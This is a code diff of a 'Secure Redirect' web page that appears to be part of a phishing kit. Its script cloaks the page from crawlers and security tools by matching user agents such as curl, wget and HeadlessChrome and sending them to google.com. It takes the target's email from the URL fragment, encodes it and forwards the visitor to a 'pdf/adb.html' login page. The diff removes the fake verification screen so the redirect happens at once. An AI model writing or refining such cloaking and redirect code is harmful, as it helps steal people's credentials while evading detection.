@@ -7,212 +7,61 @@
   <meta name="googlebot" content="noindex, nofollow" />
   <title>Secure Redirect</title>
   <style>
-    * {
-      box-sizing: border-box;
+    body {
       margin: 0;
       padding: 0;
+      background: #1a202c;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: white;
     }
-    
-    body {
-      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    
     .container {
-      width: 100%;
+      text-align: center;
       max-width: 500px;
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      overflow: hidden;
-    }
-    
-    .header {
-      background: #4a6cf7;
-      color: white;
-      padding: 25px;
-      text-align: center;
-    }
-    
-    .header h1 {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 5px;
-    }
-    
-    .header p {
-      font-size: 14px;
-      opacity: 0.9;
-    }
-    
-    .content {
-      padding: 30px;
-    }
-    
-    .status-card {
-      background: #f8f9fa;
-      border-radius: 12px;
       padding: 20px;
-      margin-bottom: 25px;
     }
-    
-    .status-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #4a6cf7;
     }
-    
-    .status-icon {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      background: #4a6cf7;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-right: 15px;
-      color: white;
-      font-size: 20px;
-    }
-    
-    .status-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #2d3748;
-    }
-    
-    .status-details {
-      background: white;
-      border-radius: 8px;
+    .status {
+      background: #2d3748;
       padding: 15px;
-      font-family: monospace;
+      border-radius: 8px;
+      margin: 15px 0;
       font-size: 14px;
-      word-break: break-all;
     }
-    
-    .progress-container {
-      margin: 30px 0;
+    .loader {
+      border: 3px solid #2d3748;
+      border-top: 3px solid #4a6cf7;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
-    
-    .progress-bar {
-      height: 6px;
-      background: #e2e8f0;
-      border-radius: 3px;
-      overflow: hidden;
-    }
-    
-    .progress-fill {
-      height: 100%;
-      background: #4a6cf7;
-      border-radius: 3px;
-      width: 0%;
-      animation: progress 2s ease-in-out infinite;
-    }
-    
-    @keyframes progress {
-      0% { width: 0%; }
-      50% { width: 70%; }
-      100% { width: 100%; }
-    }
-    
-    .redirect-info {
-      text-align: center;
-      color: #718096;
-      font-size: 14px;
-      margin-top: 20px;
-    }
-    
-    .security-badge {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-top: 25px;
-      color: #38a169;
-      font-weight: 600;
-    }
-    
-    .security-badge svg {
-      margin-right: 8px;
-    }
-    
-    @media (max-width: 600px) {
-      .content {
-        padding: 20px;
-      }
-      
-      .header {
-        padding: 20px;
-      }
-      
-      .header h1 {
-        font-size: 20px;
-      }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
-      <h1>Secure Redirect</h1>
-      <p>Processing your request securely</p>
-    </div>
-    
-    <div class="content">
-      <div class="status-card">
-        <div class="status-header">
-          <div class="status-icon">✓</div>
-          <div class="status-title">Security Check</div>
-        </div>
-        <div class="status-details" id="securityStatus">Verifying browser integrity...</div>
-      </div>
-      
-      <div class="status-card">
-        <div class="status-header">
-          <div class="status-icon">↻</div>
-          <div class="status-title">Processing</div>
-        </div>
-        <div class="status-details" id="processingStatus">Initializing secure token generation...</div>
-      </div>
-      
-      <div class="progress-container">
-        <div class="progress-bar">
-          <div class="progress-fill"></div>
-        </div>
-      </div>
-      
-      <div class="redirect-info" id="redirectInfo">
-        You will be redirected shortly. Please wait...
-      </div>
-      
-      <div class="security-badge">
-        <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
-          <path d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm0 5a1.5 1.5 0 0 1 .5 2.915l.5 1.5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1-.5-.5l.5-1.5A1.5 1.5 0 0 1 8 5z"/>
-        </svg>
-        Secure Connection Encrypted
-      </div>
-    </div>
+    <h1>Secure Redirect</h1>
+    <div class="status" id="status">Initializing security protocols...</div>
+    <div class="loader"></div>
   </div>
 
   <script>
     (function () {
-      // DOM elements
-      const securityStatus = document.getElementById('securityStatus');
-      const processingStatus = document.getElementById('processingStatus');
-      const redirectInfo = document.getElementById('redirectInfo');
-      
-      // Update status function
-      function updateStatus(element, message) {
-        element.textContent = message;
-      }
+      const status = document.getElementById('status');
       
       // Bot detection
-      updateStatus(securityStatus, 'Checking browser environment...');
-      
       const botPatterns = [
         /HeadlessChrome/i, /PhantomJS/i, /bot/i, /spider/i, 
         /crawl/i, /curl/i, /wget/i, /python-requests/i,
@@ -227,33 +76,20 @@
       );
       
       if (isBot) {
-        updateStatus(securityStatus, 'Invalid access detected. Redirecting...');
-        setTimeout(() => {
-          window.location.href = "https://google.com";
-        }, 2000);
+        window.location.href = "https://google.com";
         return;
       }
       
-      updateStatus(securityStatus, 'Browser verification passed.');
-      
       // Check for email in hash
-      updateStatus(processingStatus, 'Checking request parameters...');
-      
       const hash = window.location.hash.substring(1);
       if (!hash || !hash.includes("@")) {
-        updateStatus(processingStatus, 'Invalid request parameters. Redirecting...');
-        setTimeout(() => {
-          window.location.href = "https://google.com";
-        }, 2000);
+        window.location.href = "https://google.com";
         return;
       }
       
       const email = hash;
-      updateStatus(processingStatus, `Valid email detected: ${email}`);
       
       // Generate secure token
-      updateStatus(processingStatus, 'Generating secure token...');
-      
       function generateSecureToken(length = 64) {
         const array = new Uint8Array(length / 2);
         window.crypto.getRandomValues(array);
@@ -261,36 +97,28 @@
       }
       
       const token = generateSecureToken();
-      updateStatus(processingStatus, 'Secure token generated successfully.');
       
-      // Encode data - FIXED FUNCTION
+      // Encode data
       function encodeData(data) {
-        // Use the same encoding method as in adb.html
-        const base64 = btoa(encodeURIComponent(data));
-        return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+        return btoa(encodeURIComponent(data))
+          .replace(/\+/g, '-')
+          .replace(/\//g, '_')
+          .replace(/=+$/, '');
       }
       
       // Store in sessionStorage
       sessionStorage.setItem("redirect_email", email);
       sessionStorage.setItem("redirect_token", token);
-      updateStatus(processingStatus, 'Security data stored in session.');
       
       // Clean URL
       history.replaceState(null, "", window.location.pathname + window.location.search);
       
-      // Prepare redirect - FIXED PATH
+      // Prepare redirect
       const encodedEmail = encodeData(email);
-      // Use the correct path to adb.html
-      const redirectUrl = `pdf/adb.html#${encodedEmail}`;
+      const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
       
-      updateStatus(processingStatus, 'Preparing secure redirect...');
-      updateStatus(redirectInfo, `Redirecting to secure login...`);
-      
-      // Redirect with delay for user feedback
-      setTimeout(() => {
-        window.location.href = redirectUrl;
-      }, 2000);
-      
+      // Immediate redirect
+      window.location.href = redirectUrl;
     })();
   </script>
 </body>
